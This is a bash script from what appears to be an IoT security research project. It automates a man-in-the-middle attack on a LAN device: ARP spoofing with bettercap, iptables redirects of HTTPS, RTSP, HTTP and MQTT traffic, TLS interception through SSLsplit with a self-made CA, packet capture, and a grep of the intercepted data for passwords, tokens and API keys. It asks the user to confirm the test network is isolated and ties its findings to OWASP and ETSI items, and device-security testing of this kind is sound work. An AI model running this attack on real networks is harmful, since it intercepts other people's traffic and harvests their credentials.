#!/usr/bin/env bash
# =============================================================================
# mitm_arp.sh — ARP Spoofing + SSL/TLS Interception Setup
# IoT Security Research | Phase 3: MITM Attack
# =============================================================================
# Sets up bettercap for ARP spoofing and SSLsplit for TLS interception.
# Tests whether the IoT device validates certificates and enforces HTTPS.
#
# Usage:
#   sudo bash mitm_arp.sh --iface eth0 --target 192.168.100.X --gateway 192.168.100.1 \
#                         --out experiments/ip-camera/logs/ --label cam-s1
#
# Requires: bettercap, sslsplit, iptables, openssl
# =============================================================================

set -euo pipefail

# ── Defaults ──────────────────────────────────────────────────────────────────
IFACE="eth0"
TARGET=""
GATEWAY="192.168.100.1"
OUT_DIR="./output"
LABEL="device"
DURATION=3600       # Stop after N seconds (0 = run until Ctrl-C)
SSLSPLIT_PORT=8443  # Port SSLsplit listens on for HTTPS interception

while [[ $# -gt 0 ]]; do
  case "$1" in
    --iface)    IFACE="$2";      shift 2 ;;
    --target)   TARGET="$2";     shift 2 ;;
    --gateway)  GATEWAY="$2";    shift 2 ;;
    --out)      OUT_DIR="$2";    shift 2 ;;
    --label)    LABEL="$2";      shift 2 ;;
    --duration) DURATION="$2";   shift 2 ;;
    *) echo "[ERROR] Unknown argument: $1"; exit 1 ;;
  esac
done

[[ -z "$TARGET" ]] && { echo "[ERROR] --target is required"; exit 1; }

mkdir -p "$OUT_DIR/sslsplit_logs"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.log"
PCAP_FILE="$OUT_DIR/mitm_${LABEL}_${TIMESTAMP}.pcap"
BETTERCAP_LOG="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.log"

log() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$LOG_FILE"; }

# ── Safety check ──────────────────────────────────────────────────────────────
log "===== MITM + SSL Interception Setup ====="
log "Target   : $TARGET"
log "Gateway  : $GATEWAY"
log "Interface: $IFACE"
log ""
log "⚠  SAFETY: Ensure $TARGET is your own device on your isolated test network."
log "   Test network SSID: IoTSecTest | MAC filtering active | No internet connection"
read -r -p "Confirm test network is isolated and device is owned by you [yes/no]: " CONFIRM
[[ "$CONFIRM" != "yes" ]] && { log "Aborted."; exit 1; }

# ── Step 1: Enable IP forwarding ───────────────────────────────────────────────
log ""
log "── Step 1: Enable IP Forwarding ──"
echo 1 > /proc/sys/net/ipv4/ip_forward
log "IP forwarding enabled."

# ── Step 2: Generate SSLsplit CA certificate (if not present) ─────────────────
CA_KEY="$OUT_DIR/sslsplit_ca.key"
CA_CERT="$OUT_DIR/sslsplit_ca.crt"

if [[ ! -f "$CA_KEY" ]]; then
  log ""
  log "── Step 2: Generating SSLsplit CA Certificate ──"
  openssl genrsa -out "$CA_KEY" 4096 2>/dev/null
  openssl req -new -x509 -days 1095 \
    -key "$CA_KEY" \
    -out "$CA_CERT" \
    -subj "/CN=IoT Research CA/O=IoT Security Research/C=US" 2>/dev/null
  log "CA cert created: $CA_CERT"
  log "NOTE: Install $CA_CERT as trusted CA on test machine to inspect traffic."
else
  log "── Step 2: Using existing CA certificate ──"
fi

# ── Step 3: iptables REDIRECT rules ───────────────────────────────────────────
log ""
log "── Step 3: iptables — Redirect HTTPS/HTTP to SSLsplit ──"

# Redirect HTTPS (443) from target to SSLsplit
iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 443 \
  -j REDIRECT --to-ports "$SSLSPLIT_PORT"
# Redirect RTSP (554) for IP camera stream interception
iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 554 \
  -j REDIRECT --to-ports 8554
# Redirect plaintext HTTP (80)
iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 80 \
  -j REDIRECT --to-ports 8080
# Redirect MQTT (1883)
iptables -t nat -A PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 1883 \
  -j REDIRECT --to-ports 1884

log "iptables redirect rules active."

# ── Cleanup trap ─────────────────────────────────────────────────────────────
cleanup() {
  log ""
  log "── Cleanup: Removing iptables rules ──"
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 443 \
    -j REDIRECT --to-ports "$SSLSPLIT_PORT" 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 554 \
    -j REDIRECT --to-ports 8554 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 80 \
    -j REDIRECT --to-ports 8080 2>/dev/null || true
  iptables -t nat -D PREROUTING -i "$IFACE" -s "$TARGET" -p tcp --dport 1883 \
    -j REDIRECT --to-ports 1884 2>/dev/null || true
  echo 0 > /proc/sys/net/ipv4/ip_forward
  log "IP forwarding disabled."
  kill "$SSLSPLIT_PID" 2>/dev/null || true
  kill "$BETTERCAP_PID" 2>/dev/null || true
  kill "$TCPDUMP_PID" 2>/dev/null || true
  log "All processes stopped. Log: $LOG_FILE"
}
trap cleanup EXIT INT TERM

# ── Step 4: Start SSLsplit ────────────────────────────────────────────────────
log ""
log "── Step 4: Starting SSLsplit ──"
sslsplit \
  -k "$CA_KEY" \
  -c "$CA_CERT" \
  -l "$OUT_DIR/sslsplit_logs/connections.log" \
  -S "$OUT_DIR/sslsplit_logs/" \
  ssl 0.0.0.0 "$SSLSPLIT_PORT" \
  tcp 0.0.0.0 8080 \
  ssl 0.0.0.0 8554 &
SSLSPLIT_PID=$!
log "SSLsplit started (PID $SSLSPLIT_PID). Logs: $OUT_DIR/sslsplit_logs/"

# ── Step 5: Start packet capture ─────────────────────────────────────────────
log ""
log "── Step 5: Packet Capture ──"
tcpdump -i "$IFACE" -n "host $TARGET" -w "$PCAP_FILE" 2>>"$LOG_FILE" &
TCPDUMP_PID=$!
log "tcpdump capturing to $PCAP_FILE (PID $TCPDUMP_PID)"

# ── Step 6: Start bettercap ARP spoofing ─────────────────────────────────────
log ""
log "── Step 6: ARP Spoofing via bettercap ──"
BETTERCAP_CAP="$OUT_DIR/bettercap_${LABEL}_${TIMESTAMP}.cap"

cat > /tmp/mitm.cap <<CAPEOF
net.probe on
set arp.spoof.targets $TARGET
set arp.spoof.internal true
arp.spoof on
net.sniff on
CAPEOF

bettercap -iface "$IFACE" \
  -caplet /tmp/mitm.cap \
  -log "$BETTERCAP_LOG" &
BETTERCAP_PID=$!
log "bettercap ARP spoofing started (PID $BETTERCAP_PID). Log: $BETTERCAP_LOG"

# ── Run for duration or until Ctrl-C ─────────────────────────────────────────
log ""
if [[ "$DURATION" -gt 0 ]]; then
  log "Running for ${DURATION}s. Monitor $OUT_DIR/sslsplit_logs/ for intercepted data."
  log ""
  log "Success criteria:"
  log "  ✓ VULNERABLE    — plaintext credentials or decrypted data found in sslsplit_logs/"
  log "  ✓ CERT PINNING  — SSLsplit connections rejected (connection errors in log)"
  log "  ✓ HTTPS ENFORCE — no plaintext HTTP content captured"
  sleep "$DURATION"
else
  log "Running indefinitely. Press Ctrl-C to stop."
  log "Monitor: tail -f $OUT_DIR/sslsplit_logs/connections.log"
  wait
fi

# ── Results summary ───────────────────────────────────────────────────────────
log ""
log "===== MITM Test Complete ====="
log "Evidence files:"
ls -lh "$OUT_DIR/sslsplit_logs/"* 2>/dev/null | head -20 | tee -a "$LOG_FILE"
log ""

# Quick check for captured credentials
CRED_COUNT=$(grep -ri "password\|passwd\|authorization\|token\|api_key" \
  "$OUT_DIR/sslsplit_logs/" 2>/dev/null | wc -l || echo 0)
log "Potential credential strings found: $CRED_COUNT"

if [[ "$CRED_COUNT" -gt 0 ]]; then
  log "⚠  RESULT: SSL/TLS interception SUCCEEDED — device does not validate certificates"
  log "   OWASP: I7 (Insecure Data Transfer), I3 (Insecure Ecosystem Interfaces)"
  log "   ETSI:  Provision 5.5 violation"
else
  log "✓  No credentials captured. Check sslsplit connection log for certificate errors."
fi

log "Next: python scripts/analysis/pcap_parser.py --pcap $PCAP_FILE"
